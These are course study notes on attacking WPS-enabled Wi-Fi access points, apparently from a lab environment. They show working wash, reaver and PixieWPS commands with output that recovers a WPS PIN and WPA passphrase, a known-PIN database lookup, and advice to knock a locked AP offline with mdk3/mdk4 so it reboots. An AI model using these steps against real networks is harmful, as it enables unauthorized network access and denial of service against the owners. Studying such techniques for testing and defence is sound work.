---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 9: Attacking WPS Networks

## WPS Technology Details

_Just discussing WPS technology, requirements, etc._

## WPS Vulnerabilities

PIN verification is done in two parts. The first half is checked, then the second half rather than the entire PIN. First half has 10000 possibilities, second half has 1000. A couple tools were developed to attack this, _reaver_ and _bully._ PixieWPS takes advantage of the weak random number generator used in a few chipsets, meaning not all WPS implementations are vulnerable.

## WPS Attack

Using _wash_ to list out APs with WPS:

{% code overflow="wrap" %}
```bash
kali@kali:~$ wash -i wlan0mon
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
00:0A:D0:97:39:6F    1  -88  2.0  No   Broadcom  linksys
C8:BC:C8:FE:D9:65    2  -28  2.0  No   AtherosC  secnet
34:08:04:09:3D:38    3  -32  1.0  No   RalinkTe  wifu
```
{% endcode %}

WPS version 2 mandated mitigations to prevent brute forcing, which may actually just slow down a brutefroce. Lck indicates if WPS is locked, meaning an attack is pointless.

_wash_ by default scans the 2.4GHz band but can scan 5GHz by using the **-5** option. We can also just use airodump-ng to display WPS information using **--wps**.

Using _reaver_ to attack an AP with WPS:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v

Reaver v1.6.6 WiFi Protected Setup Attack Tool                 
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 34:08:04:09:3D:38
[+] Switching wlan0mon to channel 1
[+] Switching wlan0mon to channel 2
[+] Switching wlan0mon to channel 3
[+] Received beacon from 34:08:04:09:3D:38               
[+] Vendor: RalinkTe                                     
[+] Trying pin "12345670"
[+] Associated with 34:08:04:09:3D:38 (ESSID: wifu)
[+] Trying pin "00005678"
[+] Associated with 34:08:04:09:3D:38 (ESSID: wifu)      
[+] Trying pin "01235678"
[+] Associated with 34:08:04:09:3D:38 (ESSID: wifu)
[+] Trying pin "11115670"                                      
[+] Associated with 34:08:04:09:3D:38 (ESSID: wifu)      
[+] Trying pin "22225672"
[+] Associated with 34:08:04:09:3D:38 (ESSID: wifu)
[+] Trying pin "33335674"
[+] Associated with 34:08:04:09:3D:38 (ESSID: wifu)
[+] 0.05% complete @ 1985-10-27 11:00:00 (2 seconds/pin)
...
```
{% endcode %}

If vulnerable to the PixieWPS attack, results will be much quicker:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K

Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 34:08:04:09:3D:38
[+] Received beacon from 34:08:04:09:3D:38
[+] Vendor: RalinkTe
[+] Trying pin "12345670"
[+] Associated with 34:08:04:09:3D:38 (ESSID: wifu)
executing pixiewps -e b882382e407e4af64fcf9d71ef8ace569fd453ccafb4d1172eaf2a32defa7b36908dea0a0e55e300d5d853e7289ae8488c785af8928b16575486f1560c6a5720c1665d9d4fcdd987248e3f47fd2a00bf9de2f583f45240db1f4aa619098a81fa5ce3663bc0101509ffbfa68e8647042357de76a21718ce4d1defb9006e7396c80e696d6d7ec03bf7fce08850dfcf2a6730cf47ff274f3a1d3d1eba7570c297bbdd52188ac18a936a092b80632bbbe8ffa468caf2c935dda67a8f70bc24fcedb1 -s ec2fd098686d9fc441784e0c13e311a6e11141898ec863b78e213a89335ce7a9 -z 482cbb8708a1605324bc474f2e8881305f39ec4261521681432c12d8b1c0ff17 -a 34e844d2bae3119498c26f59a6dde7d18b5665a173d1adbb05d1907f3650118b -n f56bdccaa2cf51595e5f5ff9295dd6b1 -r 0495e5f459cd26b325b87f2d36d2e6da2d00cf157a394de126345599376525a1b0669f5483830fb504ce03453a7164c739e0619e4cc4992c9db16b73ae8ccb57c9d14670cefeda188cdb681e1c1549019db64dc27fc8ec305684f437e014ac6288c9e8be8d4b1ea33e074b6b3bd9e1b9c2f233f2996cec17b6bb68af36fdbf92f1783ded438e43bd19ff73b73f11b053ccb44669db37c4549053b99b1ae268c8b1eb38ef105e1c1b845f86a5814b4eee4892bc473b75c59462801918b5512f9f

 Pixiewps 1.4

 [?] Mode:     1 (RT/MT/CL)
 [*] Seed N1:  0xa0092e17
 [*] Seed ES1: 0x00000000
 [*] Seed ES2: 0x00000000
 [*] PSK1:     39768b33293254526142aa2d3d55dbf8
 [*] PSK2:     385c8893197a003fc767af1eebdbdda8
 [*] ES1:      00000000000000000000000000000000
 [*] ES2:      00000000000000000000000000000000
 [+] WPS pin:  96039620

 [*] Time taken: 0 s 17 ms

[+] Pixiewps: success: setting pin to 96039620
[+] WPS PIN: '96039620'
[+] WPA PSK: 'Where we are going, we dont need roads'
[+] AP SSID: 'wifu'
```
{% endcode %}

### Implementation Variations

Checking the first three bytes of the BSSID against known PINs:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo apt install airgeddon
...

kali@kali:~$ source /usr/share/airgeddon/known_pins.db

kali@kali:~$ echo ${PINDB["0013F7"]}
14755989 48703970 06017637
```
{% endcode %}

### Overcoming Unexpected Errors

#### WPS Transaction Failure

```
[!] WPS transaction failed (code: 0x03), re-trying last pin
```

* _Could be a temporary failure. Restart reaver without the PixieWPS option._

#### ACK Issues

```
[+] Sending identity response
[+] Received identity request
```

* _The wireless card doesn't acknowledge frames sent by the AP. Use a different wireless card with a different chipset._

#### WPS Lock

* _When WPS is locked, a DoS on the AP can be done via **mdk3** or **mdk4**. This will trigger a reboot a reboot which releases the lock._
